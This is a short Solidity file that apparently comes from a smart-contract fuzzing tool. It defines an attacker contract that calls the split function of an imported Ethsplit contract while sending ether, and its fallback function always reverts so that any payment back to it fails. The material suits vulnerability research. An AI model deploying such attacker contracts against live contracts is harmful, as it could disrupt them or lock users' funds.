pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/Ethsplit.sol";

contract Attack_Ethsplit0 {

  Ethsplit public target_contract;

  function Attack_Ethsplit0(address _targetContract) public payable {
      target_contract = Ethsplit(_targetContract);
  } 

  function vultron_split(uint256 vultron_amount, address ethAddress, address etcAddress) public payable{
    target_contract.split.value(vultron_amount)(ethAddress, etcAddress);
  } 

  function() public payable {
    revert();
  }
} 
